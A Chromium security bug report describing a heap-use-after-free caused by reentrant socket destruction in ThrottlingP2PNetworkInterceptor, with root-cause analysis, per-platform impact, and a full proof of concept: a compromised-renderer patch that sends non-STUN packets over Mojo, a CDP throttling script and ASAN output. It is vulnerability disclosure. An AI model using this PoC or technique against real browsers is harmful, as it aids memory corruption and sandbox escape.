# Reentrant socket destruction during ThrottlingP2PNetworkInterceptor timer callback leads to heap-use-after-free in the Network Service (browser process on Android)

| Field | Value |
|-------|-------|
| **Issue ID** | [487357841](https://issues.chromium.org/issues/487357841) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebRTC>Network |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | gu...@google.com |
| **Created** | 2026-02-25 |
| **Bounty** | $5,000.00 |

## Description

## Title

Reentrant socket destruction during ThrottlingP2PNetworkInterceptor timer callback leads to heap-use-after-free in the Network Service (browser process on Android)

## Summary

ThrottlingP2PNetworkInterceptor::OnSendNetworkTimer() holds a std::map iterator while calling socket->SendFromInterceptor(), which can synchronously destroy the socket and erase the iterator's underlying map node via UnregisterSocket(). The subsequent send\_packets\_.erase(packet\_iterator) operates on freed memory, producing a heap-use-after-free. A compromised renderer can trigger this reliably when DevTools network throttling is active. On Android, where the Network Service runs in-process within the browser by default, this constitutes a direct renderer-to-browser sandbox escape.

## Bisect

Introducing Commit: `d9dba0eed3f7bfed1be7c0650abb4870689107f2`

- Date: 2024-02-21
- Author: Florent Castelli
- Review: <https://chromium-review.googlesource.com/c/chromium/src/+/5268668>

## Root Cause

The ThrottlingP2PNetworkInterceptor maintains a std::map called send\_packets\_ that stores pending packets keyed by a monotonically increasing packet ID. When the simulated network delay expires, OnSendNetworkTimer() dequeues deliverable packets and processes them one by one. For each packet, it first looks up the corresponding entry in send\_packets\_ to obtain an iterator, then calls socket->SendFromInterceptor() to perform the actual send, and finally erases the entry from the map using that same iterator.

```
// services/network/throttling/throttling_p2p_network_interceptor.cc
void ThrottlingP2PNetworkInterceptor::OnSendNetworkTimer() {
  int64_t now = webrtc::TimeMicros();
  std::vector<webrtc::PacketDeliveryInfo> packets =
      send_network_.DequeueDeliverablePackets(now);
  for (auto& packet : packets) {
    SendPacketMap::iterator packet_iterator =
        send_packets_.find(packet.packet_id);
    if (packet_iterator == send_packets_.end()) {
      continue;
    }
    P2PSocketUdp* socket = packet_iterator->second.socket;

    if (packet.receive_time_us != webrtc::PacketDeliveryInfo::kNotReceived) {
      socket->SendFromInterceptor(packet_iterator->second.packet);
      // ^ This call may synchronously destroy the socket, which calls
      //   UnregisterSocket, invalidating packet_iterator.
    }
    send_packets_.erase(packet_iterator);
    // ^ heap-use-after-free: packet_iterator was already invalidated
  }
  // ...
}

```

The critical issue is that SendFromInterceptor() is not a leaf function. It calls DoSend(), which under certain conditions calls P2PSocket::OnError():

```
// services/network/p2p/socket_udp.cc
void P2PSocketUdp::SendFromInterceptor(const P2PPendingPacket& packet) {
  if (send_pending_) {
    send_queue_.push_back(packet);
  } else {
    std::ignore = DoSend(packet);
  }
}

```

When DoSend() encounters a packet addressed to a peer that has not completed STUN binding, it determines the packet is non-STUN data and calls OnError():

```
// services/network/p2p/socket_udp.cc
bool P2PSocketUdp::DoSend(const P2PPendingPacket& packet) {
  // ...
  if (!connected_peers_.contains(packet.to)) {
    P2PSocket::StunMessageType type = P2PSocket::StunMessageType();
    bool stun = GetStunPacketType(packet.data->first(packet.size), &type);
    if (!stun || type == STUN_DATA_INDICATION) {
      LOG(ERROR) << "Page tried to send a data packet to "
                 << packet.to.ToString()
                 << " before STUN binding is finished.";
      OnError();
      return false;
    }
    // ...
  }
  // ...
}

```

OnError() resets the Mojo receiver and client, then asks the P2PSocketManager to destroy the socket:

```
// services/network/p2p/socket.cc
void P2PSocket::OnError() {
  receiver_.reset();
  client_.reset();
  delegate_->DestroySocket(this);
}

```

P2PSocketManager::DestroySocket() erases the unique\_ptr entry from its flat\_map, which triggers the P2PSocketUdp destructor:

```
// services/network/p2p/socket_manager.cc
void P2PSocketManager::DestroySocket(P2PSocket* socket) {
  auto iter = sockets_.find(socket);
  CHECK(iter != sockets_.end());
  sockets_.erase(iter);
}

```

The P2PSocketUdp destructor calls interceptor\_->UnregisterSocket(this), which removes all entries in send\_packets\_ that belong to the destroyed socket using std::erase\_if:

```
// services/network/p2p/socket_udp.cc
P2PSocketUdp::~P2PSocketUdp() {
  if (interceptor_) {
    interceptor_->UnregisterSocket(this);
  }
}

// services/network/throttling/throttling_p2p_network_interceptor.cc
void ThrottlingP2PNetworkInterceptor::UnregisterSocket(P2PSocketUdp* socket) {
  std::erase_if(send_packets_, [&socket](auto& kv) -> bool {
    return kv.second.socket == socket;
  });
  // ...
}

```

This entire chain executes synchronously on the same thread. By the time control returns from socket->SendFromInterceptor() back to OnSendNetworkTimer(), the map node that packet\_iterator pointed to has already been freed by UnregisterSocket(). The subsequent send\_packets\_.erase(packet\_iterator) operates on freed memory.

A critical enabler is that the interceptor path bypasses the connected\_peers\_ validation that would normally reject non-STUN data. When DevTools throttling is active, SendPacket() delegates directly to the interceptor without any checks:

```
// services/network/p2p/socket_udp.cc
bool P2PSocketUdp::SendPacket(base::span<const uint8_t> data,
                              const P2PPacketInfo& packet_info) {
  if (interceptor_) {
    P2PPendingPacket packet(packet_info.destination, data,
                            packet_info.packet_options, packet_info.packet_id);
    interceptor_->EnqueueSend(std::move(packet), this);
    return true;  // bypasses all validation
  }
  // normal path with connected_peers_ check in DoSend...
}

```

The validation that would normally reject non-STUN data (in DoSend) only runs later inside the timer callback, which is exactly where the reentrant destruction occurs. The receive path in OnReceiveNetworkTimer() contains the same structural pattern.

## Attack scenario

The PoC uses a Python CDP script to enable network throttling, but that is only necessary for self-contained reproducibility. In a realistic attack the throttling prerequisite is satisfied by the victim themselves. Web developers routinely enable network throttling through the DevTools Network panel (e.g. selecting "Slow 3G" or "Fast 3G") while debugging web applications, and automated testing frameworks such as Puppeteer and Playwright programmatically enable throttling via CDP as a standard part of their test harnesses. In either case the attacker does not need to control the throttling setup; they only need the victim to visit attacker-controlled content while throttling is already active.

Once the attacker achieves renderer code execution through a separate renderer vulnerability, the compromised renderer interacts with the Network Service directly through Mojo IPC without any JavaScript or WebRTC API involvement. The relevant Mojo interface is straightforward:

```
// services/network/public/mojom/p2p.mojom
interface P2PSocketManager {
  CreateSocket(P2PSocketType type,
               IPEndPoint local_address,
               P2PPortRange port_range,
               P2PHostAndIPEndPoint remote_address,
               MutableNetworkTrafficAnnotationTag traffic_annotation,
               mojo_base.mojom.UnguessableToken? devtools_token,
               pending_remote<P2PSocketClient> client,
               pending_receiver<P2PSocket> socket);
};

interface P2PSocket {
  Send(mojo_base.mojom.ReadOnlyBuffer data,
       P2PPacketInfo packet_info);
};

```

The attack proceeds as follows. The compromised renderer calls `CreateSocket` with `P2PSocketType::UDP` and the frame's `devtools_token`. Because throttling is active under that token, the socket is created with a non-null `interceptor_` pointer. The renderer immediately calls `P2PSocket::Send` with non-STUN data addressed to an arbitrary destination. The interceptor buffers the packet, and when its delay timer fires, the reentrant destruction chain described in the root cause section triggers the heap-use-after-free. The entire sequence completes within a single timer tick, requiring no user interaction beyond having DevTools throttling enabled.

## Impact across platforms

The severity of this vulnerability depends on where the Network Service runs relative to the browser process. Chromium controls this through the `kNetworkServiceInProcess` feature flag:

```
// content/public/common/content_features.cc
BASE_FEATURE(kNetworkServiceInProcess,
             "NetworkServiceInProcess2",
#if BUILDFLAG(IS_ANDROID)
             base::FEATURE_ENABLED_BY_DEFAULT
#else
             base::FEATURE_DISABLED_BY_DEFAULT
#endif
);

```

The runtime decision is made in `IsInProcessNetworkServiceImpl()`. On Android, devices with 1 GB of RAM or less are forced into in-process mode regardless of the feature flag:

```
// content/browser/network/network_service_util_internal.cc
constexpr base::ByteCount kNetworkServiceOutOfProcessThreshold =
    base::MiB(1077);

bool IsInProcessNetworkServiceImpl() {
  if (base::CommandLine::ForCurrentProcess()->HasSwitch(
          switches::kSingleProcess)) {
    return true;
  }
  if (g_force_network_service_process_in_or_out) {
    return *g_force_network_service_process_in_or_out;
  }
#if BUILDFLAG(IS_ANDROID)
  if (base::SysInfo::AmountOfPhysicalMemory() <=
      kNetworkServiceOutOfProcessThreshold) {
    return true;
  }
#endif
  return base::FeatureList::IsEnabled(features::kNetworkServiceInProcess);
}

```

On Android, the Network Service runs in-process within the browser process by default. Because OnSendNetworkTimer() executes on the browser process's IO thread in this configuration, the heap-use-after-free corrupts browser process memory directly. A compromised renderer triggering this bug on Android achieves memory corruption in the browser process without any intermediate sandbox boundary, making this a direct renderer-to-browser sandbox escape.

On desktop platforms (Linux, Windows, macOS), the Network Service runs as a separate utility process. However, the Network Service sandbox is disabled by default on Linux and Windows:

```
// sandbox/policy/features.cc
#if !BUILDFLAG(IS_MAC) && !BUILDFLAG(IS_FUCHSIA)
// Enables network service sandbox.
// (Only causes an effect when feature kNetworkServiceInProcess is disabled.)
BASE_FEATURE(kNetworkServiceSandbox, base::FEATURE_DISABLED_BY_DEFAULT);

```

On macOS and Fuchsia the sandbox is always enabled and does not depend on this feature flag. On desktop Linux and Windows, because `kNetworkServiceSandbox` defaults to disabled, achieving code execution in the Network Service process is effectively equivalent to unsandboxed code execution. On macOS the attacker would still need to escape the Network Service sandbox after gaining code execution there.

The PoC below was tested on desktop Linux with an out-of-process Network Service. The ASAN report confirms the crash on the `Chrome_ChildIOT` thread of the utility process (identified by `content::UtilityMain` in the thread creation stack and the browser process logging "Network service crashed or was terminated, restarting service"). Adding `--enable-features=NetworkServiceInProcess` to the launch flags moves the Network Service into the browser process, matching the default Android configuration.

## Reproduce

The PoC operates under the compromised renderer threat model. It requires three components: a renderer-side patch that simulates the compromised renderer creating P2P sockets and sending non-STUN data directly via Mojo IPC (bypassing WebRTC JavaScript APIs entirely), a minimal HTML page that the patched renderer recognizes as the trigger, and a Python orchestrator that uses CDP to enable network throttling. All process sandboxes remain active.

Apply the following patch to the renderer, then build an ASAN-instrumented Chrome:

```
diff --git a/content/renderer/render_frame_impl.cc b/content/renderer/render_frame_impl.cc
--- a/content/renderer/render_frame_impl.cc
+++ b/content/renderer/render_frame_impl.cc
@@ -117,6 +117,14 @@
 #include "base/debug/dump_without_crashing.h"
 #include "base/feature_list.h"
 #include "base/logging.h"
+// === PoC includes ===
+#include "services/network/public/mojom/p2p.mojom.h"
+#include "services/network/public/cpp/p2p_socket_type.h"
+#include "mojo/public/cpp/bindings/remote.h"
+#include "mojo/public/cpp/bindings/receiver.h"
+#include "net/traffic_annotation/network_traffic_annotation.h"
+// === END PoC includes ===
+
 #include "base/memory/weak_ptr.h"
 #include "base/metrics/field_trial.h"
 #include "base/metrics/field_trial_params.h"
@@ -3856,6 +3864,72 @@ void RenderFrameImpl::DidFailLoad(const WebURLError& error,
   // ...
 }

+// === Compromised renderer PoC: direct Mojo P2P socket creation ===
+namespace {
+
+class PocP2PSocketClient : public network::mojom::P2PSocketClient {
+ public:
+  PocP2PSocketClient() = default;
+  ~PocP2PSocketClient() override = default;
+
+  mojo::PendingRemote<network::mojom::P2PSocketClient> Bind() {
+    return receiver_.BindNewPipeAndPassRemote();
+  }
+
+  mojo::Remote<network::mojom::P2PSocket>& socket() { return socket_; }
+  mojo::PendingReceiver<network::mojom::P2PSocket> BindSocket() {
+    return socket_.BindNewPipeAndPassReceiver();
+  }
+
+  void SocketCreated(const net::IPEndPoint& local_address,
+                     const net::IPEndPoint& remote_address) override {
+    LOG(ERROR) << "POC: P2P socket created, local=" << local_address.ToString()
+               << ", sending non-STUN data";
+    uint8_t fake_data[64] = {};
+    std::fill(std::begin(fake_data), std::end(fake_data),
+              static_cast<uint8_t>(0x41));
+    net::IPEndPoint target(net::IPAddress(10, 0, 0, 1), 9999);
+    for (int i = 0; i < 5; i++) {
+      network::P2PPacketInfo info;
+      info.destination = target;
+      info.packet_id = i + 1;
+      socket_->Send(fake_data, info);
+    }
+    LOG(ERROR) << "POC: Sent 5 non-STUN packets via Mojo";
+  }
+  void SendComplete(
+      const network::P2PSendPacketMetrics& send_metrics) override {}
+  void SendBatchComplete(
+      const std::vector<network::P2PSendPacketMetrics>& metrics) override {}
+  void DataReceived(
+      std::vector<network::mojom::P2PReceivedPacketPtr> packets) override {}
+
+ private:
+  mojo::Receiver<network::mojom::P2PSocketClient> receiver_{this};
+  mojo::Remote<network::mojom::P2PSocket> socket_;
+};
+
+// Static raw pointers so they outlive DidFinishLoad (intentional leak for PoC)
+static PocP2PSocketClient* g_poc_client = nullptr;
+static mojo::Remote<network::mojom::P2PSocketManager>* g_poc_manager = nullptr;
+
+}  // namespace
+// === END compromised renderer PoC ===
+
 void RenderFrameImpl::DidFinishLoad() {
   TRACE_EVENT1("navigation,benchmark,rail", "RenderFrameImpl::didFinishLoad",
                "frame_token", frame_token_);
@@ -3870,6 +3934,37 @@ void RenderFrameImpl::DidFinishLoad() {
   for (auto& observer : observers_)
     observer.DidFinishLoad();

+  // === Compromised renderer PoC trigger ===
+  if (!frame_->Parent() && !g_poc_client) {
+    std::string url = frame_->GetDocument().Url().GetString().Utf8();
+    if (url.find("poc.html") != std::string::npos) {
+      LOG(ERROR) << "POC: Page loaded, will create P2P socket in 3s "
+                 << "(waiting for CDP to set throttling)";
+
+      g_poc_manager = new mojo::Remote<network::mojom::P2PSocketManager>();
+      GetBrowserInterfaceBroker().GetInterface(
+          g_poc_manager->BindNewPipeAndPassReceiver());
+      base::UnguessableToken token = devtools_frame_token_;
+
+      base::SingleThreadTaskRunner::GetCurrentDefault()->PostDelayedTask(
+          FROM_HERE,
+          base::BindOnce([](base::UnguessableToken token) {
+            LOG(ERROR) << "POC: Creating P2P socket via Mojo directly";
+            g_poc_client = new PocP2PSocketClient();
+            net::IPEndPoint local_addr(net::IPAddress::IPv4AllZeros(), 0);
+            network::P2PHostAndIPEndPoint remote_info;
+
+            (*g_poc_manager)->CreateSocket(
+                network::P2P_SOCKET_UDP,
+                local_addr,
+                network::P2PPortRange(0, 0),
+                remote_info,
+                net::MutableNetworkTrafficAnnotationTag(
+                    net::DefineNetworkTrafficAnnotation("poc_p2p", R"()")),
+                token,
+                g_poc_client->Bind(),
+                g_poc_client->BindSocket());
+
+            LOG(ERROR) << "POC: CreateSocket called with devtools_token="
+                       << token.ToString();
+          }, token),
+          base::Seconds(3));
+    }
+  }
+  // === END PoC trigger ===
+
   // Don't send this message while the frame is swapped out.

```

This patch simulates a compromised renderer that directly calls `P2PSocketManager::CreateSocket` and `P2PSocket::Send` via Mojo IPC, without involving WebRTC JavaScript APIs or the `FilteringNetworkManager` permission checks that the normal code path requires. The 3-second delay in `DidFinishLoad` allows time for the CDP orchestrator to enable network throttling before the P2P socket is created. The `devtools_frame_token_` is passed to `CreateSocket` so the Network Service associates the socket with the active throttling conditions, ensuring the interceptor is engaged.

Build with:

```
autoninja -C out/asan-release chrome

```

Save the following as `poc.html`:

```
<!DOCTYPE html>
<html>
<head><title>P2P Interceptor Iterator Invalidation UAF</title></head>
<body>
<h2>P2P Interceptor Iterator Invalidation UAF</h2>
<pre id="log"></pre>
<script>
// The compromised renderer patch in render_frame_impl.cc creates P2P sockets
// directly via Mojo on page load. No WebRTC JS API needed.
document.getElementById('log').textContent =
    'Page loaded. Renderer patch will create P2P sockets via Mojo directly.\n' +
    'If throttling is active, ASAN should report heap-use-after-free.\n';
</script>
</body>
</html>

```

Save the following as `poc_trigger.py`:

```
#!/usr/bin/env python3
"""
PoC Trigger: P2P Interceptor Iterator Invalidation UAF
1. Starts HTTP server for poc.html
2. Launches Chrome with ASAN + remote debugging
3. Navigates to PoC page FIRST (wait for load)
4. THEN enables network throttling via CDP (so it survives navigation)
5. THEN the patched renderer creates P2P sockets via Mojo directly
6. Timer fires -> OnSendNetworkTimer -> iterator invalidation -> UAF
"""
import json
import http.server
import threading
import subprocess
import sys
import os
import tempfile
import time
import urllib.request
import socket
import base64
import struct

CHROME = os.path.expanduser("~/chromium/src/out/asan-release/chrome")
HTTP_PORT = 8899
CDP_PORT = 9222
LOG_FILE = "/tmp/poc-p2p-interceptor.log"


# Minimal sync WebSocket client (no external deps)
class MiniWS:
    def __init__(self, url):
        url = url.replace("ws://", "")
        host_port, self.path = url.split("/", 1)
        self.path = "/" + self.path
        self.host, port = host_port.split(":")
        self.port = int(port)
        self.sock = socket.create_connection((self.host, self.port))
        self.sock.settimeout(15)
        self._handshake()

    def _handshake(self):
        key = base64.b64encode(os.urandom(16)).decode()
        req = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Upgrade: websocket\r\n"
            f"Connection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\n"
            f"Sec-WebSocket-Version: 13\r\n\r\n"
        )
        self.sock.sendall(req.encode())
        resp = b""
        while b"\r\n\r\n" not in resp:
            resp += self.sock.recv(4096)
        if b"101" not in resp.split(b"\r\n")[0]:
            raise Exception(f"WS handshake failed: {resp[:200]}")

    def send(self, data):
        payload = data.encode() if isinstance(data, str) else data
        mask_key = os.urandom(4)
        length = len(payload)
        header = bytearray()
        header.append(0x81)
        if length < 126:
            header.append(0x80 | length)
        elif length < 65536:
            header.append(0x80 | 126)
            header += struct.pack(">H", length)
        else:
            header.append(0x80 | 127)
            header += struct.pack(">Q", length)
        header += mask_key
        masked = bytearray(b ^ mask_key[i % 4] for i, b in enumerate(payload))
        self.sock.sendall(bytes(header) + bytes(masked))

    def recv(self):
        def read_exact(n):
            buf = b""
            while len(buf) < n:
                chunk = self.sock.recv(n - len(buf))
                if not chunk:
                    raise Exception("WS connection closed")
                buf += chunk
            return buf
        hdr = read_exact(2)
        length = hdr[1] & 0x7f
        if length == 126:
            length = struct.unpack(">H", read_exact(2))[0]
        elif length == 127:
            length = struct.unpack(">Q", read_exact(8))[0]
        return read_exact(length).decode()

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **kw):
        super().__init__(*a, directory=os.path.dirname(os.path.abspath(__file__)), **kw)
    def log_message(self, *a):
        pass


def start_http():
    srv = http.server.HTTPServer(("127.0.0.1", HTTP_PORT), Handler)
    srv.serve_forever()


def wait_for_cdp(timeout=30):
    for _ in range(timeout * 2):
        try:
            resp = urllib.request.urlopen(f"http://127.0.0.1:{CDP_PORT}/json")
            return json.loads(resp.read())
        except Exception:
            time.sleep(0.5)
    return None


def main():
    # HTTP server
    threading.Thread(target=start_http, daemon=True).start()
    print(f"[+] HTTP server on :{HTTP_PORT}")

    # Launch Chrome - redirect stderr to file to avoid pipe buffer blocking
    user_data = tempfile.mkdtemp(prefix="poc-p2p-")
    cmd = [
        CHROME,
        "--disable-gpu",
        f"--remote-debugging-port={CDP_PORT}",
        f"--user-data-dir={user_data}",
        "--headless",
        "--enable-logging=stderr",
        "--v=1",
        "about:blank",
    ]
    env = os.environ.copy()
    env["ASAN_OPTIONS"] = "detect_odr_violation=0"

    print(f"[+] Launching Chrome...")
    stderr_file = open(LOG_FILE, "w")
    proc = subprocess.Popen(cmd, env=env, stderr=stderr_file, stdout=subprocess.DEVNULL)

    # Wait for CDP
    print("[*] Waiting for CDP...")
    targets = wait_for_cdp()
    if not targets:
        print("[-] CDP timeout")
        proc.terminate()
        stderr_file.close()
        return

    page = next((t for t in targets if t.get("type") == "page"), None)
    if not page:
        print("[-] No page target")
        proc.terminate()
        stderr_file.close()
        return

    ws_url = page["webSocketDebuggerUrl"]
    print(f"[+] CDP target: {ws_url}")

    ws = MiniWS(ws_url)
    msg_id = 0

    def cdp(method, params=None):
        nonlocal msg_id
        msg_id += 1
        mid = msg_id
        msg = {"id": mid, "method": method}
        if params:
            msg["params"] = params
        ws.send(json.dumps(msg))
        while True:
            raw = ws.recv()
            resp = json.loads(raw)
            if resp.get("id") == mid:
                return resp

    def wait_for_event(name, timeout=10):
        """Read CDP messages until we see the named event."""
        old_timeout = ws.sock.gettimeout()
        ws.sock.settimeout(timeout)
        try:
            while True:
                raw = ws.recv()
                msg = json.loads(raw)
                if msg.get("method") == name:
                    return msg
        except socket.timeout:
            return None
        finally:
            ws.sock.settimeout(old_timeout)

    try:
        # Step 1: Navigate to poc.html and wait for it to fully load
        r = cdp("Page.enable")
        print(f"[+] Page.enable: id={r.get('id')}")

        r = cdp("Page.navigate", {"url": f"http://127.0.0.1:{HTTP_PORT}/poc.html"})
        print(f"[+] Page.navigate: id={r.get('id')}")

        evt = wait_for_event("Page.loadEventFired", timeout=10)
        if evt:
            print("[+] Page loaded successfully")
        else:
            print("[!] Page load timeout, continuing anyway")

        # Step 2: AFTER navigation is complete, enable network throttling.
        r = cdp("Network.enable")
        print(f"[+] Network.enable: id={r.get('id')}")

        r = cdp("Network.emulateNetworkConditions", {
            "offline": False,
            "latency": 50,
            "downloadThroughput": 1000000,
            "uploadThroughput": 1000000,
        })
        print(f"[+] Network.emulateNetworkConditions: id={r.get('id')}")

        # Step 3: The patched renderer will create P2P sockets via Mojo
        # directly (3s delayed task in DidFinishLoad), bypassing WebRTC JS
        # API and FilteringNetworkManager permissions entirely.
        # Wait for the delayed task + interceptor timer + crash.
        print("[*] Throttling active. Renderer will create P2P sockets in ~3s. Waiting for crash (20s)...")
        time.sleep(20)

    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        ws.close()

    # Collect results
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()

    stderr_file.close()

    with open(LOG_FILE, "r") as f:
        stderr = f.read()

    if "AddressSanitizer" in stderr:
        print("\n[!!!] ASAN report detected!\n")
        for line in stderr.split("\n"):
            if any(k in line for k in ["ERROR:", "SUMMARY:", "heap-use-after-free",
                                        "READ of size", "WRITE of size",
                                        "ThrottlingP2PNetworkInterceptor",
                                        "OnSendNetworkTimer", "UnregisterSocket",
                                        "POC"]):
                print(f"  {line}")
    elif "POC" in stderr:
        print("[+] PoC code path hit but no ASAN crash")
        for line in stderr.split("\n"):
            if "POC" in line or "UpdateConditions" in line:
                print(f"  {line}")
    else:
        print("[-] No ASAN report or PoC markers found")
        print("[*] Last 30 lines of stderr:")
        for line in stderr.split("\n")[-30:]:
            print(f"  {line}")

    print(f"\n[*] Full log: {LOG_FILE}")


if __name__ == "__main__":
    main()

```

Run the PoC:

```
python3 poc_trigger.py

```

Output:

```
[+] HTTP server on :8899
[+] Launching Chrome...
[*] Waiting for CDP...
[+] CDP target: ws://127.0.0.1:9222/devtools/page/...
[+] Page.enable: id=1
[+] Page.navigate: id=2
[+] Page loaded successfully
[+] Network.enable: id=3
[+] Network.emulateNetworkConditions: id=4
[*] Throttling active. Renderer will create P2P sockets in ~3s. Waiting for crash (20s)...

[!!!] ASAN report detected!

```

ASAN report:

```
==3434823==ERROR: AddressSanitizer: heap-use-after-free on address 0x7cbac90794c8 at pc 0x7fab27b88313 bp 0x7baabe2ac130 sp 0x7baabe2ac128
READ of size 8 at 0x7cbac90794c8 thread T5 (Chrome_ChildIOT)
    #0 0x7fab27b88312 in network::ThrottlingP2PNetworkInterceptor::OnSendNetworkTimer() gen/third_party/libc++/src/include/__tree:208:12
    #1 0x7fab27b898f2 in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #2 0x7fab47696e7f in base::OneShotTimer::RunUserTask() base/functional/callback.h:155:12
    #3 0x7fab4769ab4c in base::internal::Invoker<...>::Run(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #4 0x7fab475614f2 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #5 0x7fab475e29de in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #6 0x7fab475e19b6 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #7 0x7fab4778fe7b in base::MessagePumpEpoll::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_epoll.cc:224:55
    #8 0x7fab475e4058 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #9 0x7fab474cbb52 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #10 0x7fab4767a0a2 in base::Thread::Run(base::RunLoop*) base/threading/thread.cc:361:13
    #11 0x7fab388ba251 in content::(anonymous namespace)::ChildIOThread::Run(base::RunLoop*) content/child/child_process.cc:69:19
    #12 0x7fab4767a672 in base::Thread::ThreadMain() base/threading/thread.cc:436:3
    #13 0x7fab476de6fc in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #14 0x56500a182136 in asan_thread_start(void*) asan_interceptors.cpp

0x7cbac90794c8 is located 8 bytes inside of 216-byte region [0x7cbac90794c0,0x7cbac9079598)
freed by thread T5 (Chrome_ChildIOT) here:
    #0 0x56500a1bebf2 in operator delete(void*, unsigned long)
    #1 0x7fab27b8672e in network::ThrottlingP2PNetworkInterceptor::UnregisterSocket(network::P2PSocketUdp*) gen/third_party/libc++/src/include/__new/allocate.h:63:10
    #2 0x7fab27b74f25 in network::P2PSocketUdp::~P2PSocketUdp() services/network/p2p/socket_udp.cc:232:19
    #3 0x7fab27b7541d in network::P2PSocketUdp::~P2PSocketUdp() services/network/p2p/socket_udp.cc:230:31
    #4 0x7fab27b57ea9 in base::internal::flat_tree<...>::erase(...) gen/third_party/libc++/src/include/__memory/unique_ptr.h:74:5
    #5 0x7fab27b58253 in non-virtual thunk to network::P2PSocketManager::DestroySocket(network::P2PSocket*) services/network/p2p/socket_manager.cc:230:12
    #6 0x7fab27b52c67 in network::P2PSocket::OnError() services/network/p2p/socket.cc:175:14
    #7 0x7fab27b79076 in network::P2PSocketUdp::DoSend(network::P2PPendingPacket const&) services/network/p2p/socket_udp.cc:434:7
    #8 0x7fab27b87eeb in network::ThrottlingP2PNetworkInterceptor::OnSendNetworkTimer() services/network/throttling/throttling_p2p_network_interceptor.cc:158:15
    #9 0x7fab27b898f2 in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #10 0x7fab47696e7f in base::OneShotTimer::RunUserTask() base/functional/callback.h:155:12
    #11 0x7fab4769ab4c in base::internal::Invoker<...>::Run(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #12 0x7fab475614f2 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #13 0x7fab475e29de in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #14 0x7fab475e19b6 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #15 0x7fab4778fe7b in base::MessagePumpEpoll::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_epoll.cc:224:55
    #16 0x7fab475e4058 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #17 0x7fab474cbb52 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #18 0x7fab4767a0a2 in base::Thread::Run(base::RunLoop*) base/threading/thread.cc:361:13
    #19 0x7fab388ba251 in content::(anonymous namespace)::ChildIOThread::Run(base::RunLoop*) content/child/child_process.cc:69:19
    #20 0x7fab4767a672 in base::Thread::ThreadMain() base/threading/thread.cc:436:3
    #21 0x7fab476de6fc in base::(anonymous namespace)::ThreadFunc(void*) base/threading/platform_thread_posix.cc:102:13
    #22 0x56500a182136 in asan_thread_start(void*) asan_interceptors.cpp

previously allocated by thread T5 (Chrome_ChildIOT) here:
    #0 0x56500a1bdfed in operator new(unsigned long)
    #1 0x7fab27b89e90 in std::__Cr::__try_key_extraction_impl<...>(...) gen/third_party/libc++/src/include/__new/allocate.h:43:28
    #2 0x7fab27b8789f in network::ThrottlingP2PNetworkInterceptor::EnqueueSend(network::P2PPendingPacket, network::P2PSocketUdp*) gen/third_party/libc++/src/include/__utility/try_key_extraction.h:108:10
    #3 0x7fab27b7b4df in network::P2PSocketUdp::SendPacket(base::span<unsigned char const, ...>, network::P2PPacketInfo const&) services/network/p2p/socket_udp.cc:566:19
    #4 0x7fab27b7afcb in network::P2PSocketUdp::Send(base::span<unsigned char const, ...>, network::P2PPacketInfo const&) services/network/p2p/socket_udp.cc:553:7
    #5 0x7fab27dcfcd3 in network::mojom::P2PSocketStubDispatch::Accept(network::mojom::P2PSocket*, mojo::Message*) gen/services/network/public/mojom/p2p.mojom.cc:1444:13
    #6 0x7fab48abb2f2 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1085:54
    #7 0x7fab48ad269b in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:44:19
    #8 0x7fab48ac0ba4 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:747:20
    #9 0x7fab48ae1c7e in mojo::internal::MultiplexRouter::ProcessIncomingMessage(...) mojo/public/cpp/bindings/lib/multiplex_router.cc:1204:42
    #10 0x7fab48ae04ad in mojo::internal::MultiplexRouter::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/multiplex_router.cc:790:7
    #11 0x7fab48ad269b in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:44:19
